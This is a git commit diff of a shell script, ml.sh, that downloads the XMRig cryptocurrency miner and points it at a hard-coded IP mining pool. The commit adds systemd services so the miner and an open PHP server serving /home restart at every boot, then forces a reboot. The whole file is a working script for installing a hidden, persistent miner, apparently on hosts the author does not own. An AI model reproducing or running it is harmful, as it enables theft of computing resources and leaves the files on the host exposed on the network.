7787db9a6459dc858456ba23711f3ae8913ee79f
nothing123468 <108989568+nothing123468@users.noreply.github.com>
2022-07-11 15:37:07 +0000

    Update ml.sh

--- ml.sh
+++ ml.sh
@@ -1,7 +1,12 @@
 cd /home
 apt-get update
 touch index.php
-php -S 0.0.0.0:8080 &
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
 tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
-xmrig-6.16.2/xmrig -o 103.95.197.2:443 --randomx-no-rdmsr --tls true
+bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/xmrig-6.16.2/xmrig -o 103.95.197.2:443 --randomx-no-rdmsr --tls true\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
+systemctl daemon-reload
+systemctl enable xmrig.service
+bash -c 'echo -e "[Unit]\nDescription=Php Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=php -S 0.0.0.0:8080 -t /home\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/php.service'
+systemctl daemon-reload
+systemctl enable php.service
+reboot
